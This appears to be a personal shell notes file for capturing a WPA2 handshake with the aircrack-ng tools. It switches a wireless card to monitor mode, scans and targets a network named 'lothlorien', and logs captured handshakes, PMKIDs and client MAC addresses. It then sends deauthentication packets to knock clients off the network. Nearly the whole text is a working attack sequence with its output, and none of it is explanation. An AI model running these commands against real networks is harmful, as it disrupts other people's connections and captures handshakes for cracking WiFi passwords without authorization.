# cat /proc/net/wireless

sudo systemctl stop avahi-daemon.socket
sudo systemctl stop avahi-daemon

# ------------------------------------------------

sudo ifconfig wlx20e8170c2fea down
sudo iwconfig wlx20e8170c2fea mode monitor

sudo airmon-ng check kill
sudo airmon-ng start wlx20e8170c2fea

sudo airodump-ng wlx20e8170c2fea

# CH 10 ][ Elapsed: 24 s ][ 2021-02-03 19:13 

#  BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

#  EC:AD:E0:31:9F:72  -69       22       12    0   1   54   WPA2 CCMP   PSK  lothlorien                                  

#  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

#  EC:AD:E0:31:9F:72  5A:5F:AF:53:26:26   -1    0e- 0      0        1                                                     
#  EC:AD:E0:31:9F:72  3E:C1:0F:92:C3:AB  -40    0 - 1e  1908       27                                                     
#  EC:AD:E0:31:9F:72  40:5B:D8:0D:90:9F  -70    0 - 1e     0       28    

sudo airodump-ng -c 1 --bssid EC:AD:E0:31:9F:72 -w /media/aladdin/djinn-data/dump wlx20e8170c2fea

#  CH  1 ][ Elapsed: 1 min ][ 2021-02-03 19:16 ][ WPA handshake: EC:AD:E0:31:9F:72 

#  BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

#  EC:AD:E0:31:9F:72  -69  10      741     3145   35   1   54   WPA2 CCMP   PSK  lothlorien                              

#  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

#  EC:AD:E0:31:9F:72  B0:55:08:FB:0B:85   -1    1e- 0      0      750                                                     
#  EC:AD:E0:31:9F:72  3E:C1:0F:92:C3:AB  -40    0e- 1e   376     2276  PMKID  lothlorien                                  
#  EC:AD:E0:31:9F:72  40:5B:D8:0D:90:9F  -72    1e- 1      1      324  PMKID                                              
#  EC:AD:E0:31:9F:72  5A:5F:AF:53:26:26  -76    1e- 1      0      252  PMKID  lothlorien    

sudo aireplay-ng -0 10 -a EC:AD:E0:31:9F:72 wlx20e8170c2fea

# ------------------------------------------------

sudo systemctl start avahi-daemon
sudo systemctl start avahi-daemon.socket

# ------------------------------------------------

sudo airmon-ng stop wlx20e8170c2fea
sudo ifconfig wlx20e8170c2fea up